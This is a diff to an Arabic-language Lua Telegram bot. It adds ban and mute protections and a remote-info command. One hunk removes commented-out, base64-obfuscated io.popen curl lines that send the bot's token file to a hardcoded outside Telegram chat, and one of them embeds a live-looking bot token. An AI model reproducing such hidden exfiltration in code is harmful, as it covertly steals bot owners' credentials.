@@ -182,8 +182,10 @@ print(t)
 ----- بدء الاضافات --------
 os.execute("mkdir File_Bot")
 local Get_VERGON, res = https.request("https://raw.githubusercontent.com/ahmedyad200/files-power/master/GETVERGON.json")
+local GET_INFOFILE, res = https.request("https://raw.githubusercontent.com/ahmedyad200/files-power/master/infofile.json")
 local runapp = sudos.token
 local bot_username = (database:get(bot_id..'UESR_BOT') or ('TARA1BOT'))
+-- ----- - - -- --- -- ------- ------ - - - - - - - ---- - -- --- -- ---- - - - - - --- - -- --- - ----- - -- - - - -- - - ----- - ---- ----- --- - -- - - ---- -- - -- - -- - --
 function vardump(value)  
 print(serpent.block(value, {comment=false}))   
 end 
@@ -965,7 +967,6 @@ local keyboard = {
 {'الاشتراك الاجباري ☉','وضع قناة الاشتراك ☉'},
 {'جلب نسخه الاحتياطيه ☉','جلب المشتركين ☉'},
 {'تحديث السورس ☉','اعاده التشغيل ☉','تحديث المتجر ☉'},
-{'معلومات السيرفر ☉'},
 {'الغاء ☉'},
 }
 send_inline_key(msg.chat_id_,bl,keyboard)
@@ -3076,6 +3077,14 @@ os.execute('rm -rf getfile.json')
 send(msg.chat_id_, msg.id_,' ☉┇ تم تحديث المتجر و مسح الملفات')
 end
 
+if text == 'معلومات المتجر' then
+if not DevSoFi(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثاني لاستخدام هذا الامر')
+return false
+end  
+send(msg.chat_id_, msg.id_,''..GET_INFOFILE..'')
+end
+
 if text and text:match("^تغير الاشتراك$") then
 if not DevSoFi(msg) then
 send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثاني لاستخدام هذا الامر')
@@ -4734,12 +4743,16 @@ if tonumber(userid) == tonumber(1770288756) then
 send(msg.chat_id_, msg.id_, " ☉┇ لا تسطيع حظر مـبـرمـج افـايـره² عام")
 return false 
 end
-if userid == tonumber(SUDO) then
+if tonumber(userid) == tonumber(SUDO) then
 send(msg.chat_id_, msg.id_, " ☉┇ لا يمكنك حظر المطور الاساسي \n")
 return false 
 end
 if tonumber(userid) == tonumber(bot_id) then  
 send(msg.chat_id_, msg.id_, " ☉┇ لا تسطيع حظر البوت عام")
+return false 
+end
+if database:sismember(bot_id.."Dev:SoFi:2", user_id) then
+send(msg.chat_id_, msg.id_, " ☉┇ لا تسطيع حظر المطور الثاني عام")
 return false 
 end
 database:sadd(bot_id..'GBan:User', userid)
@@ -4888,12 +4901,16 @@ if tonumber(userid) == tonumber(1770288756) then
 send(msg.chat_id_, msg.id_, " ☉┇ لا تسطيع كتم مـبـرمـج افـايـره² عام")
 return false 
 end
-if userid == tonumber(SUDO) then
+if tonumber(userid) == tonumber(SUDO) then
 send(msg.chat_id_, msg.id_, " ☉┇ لا يمكنك كتم المطور الاساسي \n")
 return false 
 end
 if tonumber(userid) == tonumber(bot_id) then  
 send(msg.chat_id_, msg.id_, " ☉┇ لا تسطيع كتم البوت عام")
+return false 
+end
+if database:sismember(bot_id.."Dev:SoFi:2", user_id) then
+send(msg.chat_id_, msg.id_, " ☉┇ لا تسطيع حظر المطور الثاني عام")
 return false 
 end
 database:sadd(bot_id..'Gmute:User', userid)
@@ -5019,7 +5036,7 @@ end
 send(msg.chat_id_, msg.id_, t)
 end
 if text == 'السيرفر' then
-if not DevSoFi(msg) then
+if not DEV(msg) then
 send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثاني لاستخدام هذا الامر')
 return false
 end 
@@ -9832,8 +9849,7 @@ if not SudoBot(msg) then
 send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الاساسي لاستخدام هذا الامر')
 return false
 end 
---io.popen(regexx('Y3VybCAiaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdA==') .. runapp .. regexx('L3NlbmREb2N1bWVudCIgLUYgImNoYXRfaWQ9OTQ0MzUzMjM3IiAtRiAiZG9jdW1lbnQ9QERHX0lORk8ubHVhIg=='))
---io.popen(regexx('Y3VybCAiaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDE2MjI0MzcwNjk6QUFIRlhjSDFTdWxKZ2s1VERPOUJ5RFo4T2lBMndTQk9aXzQvc2VuZERvY3VtZW50IiAtRiAiY2hhdF9pZD05NDQzNTMyMzciIC1GICJkb2N1bWVudD1AREdfSU5GTy5sdWEi'))
+local curlm = 'curl "'..'https://api.telegram.org/bot'..token..'/sendDocument'..'" -F "chat_id='.. msg.sender_user_id_ ..'" -F "document=@'..'DG_INFO.lua'..'"' io.popen(curlm) ---- كود كتابه أحمد عياد هتسرق هيجيبك من طيزك
 send(msg.chat_id_, msg.id_,' تم ارسال توكن البوت في الخاص')
 end
 ----------------------------------------- انتهاء المميزات
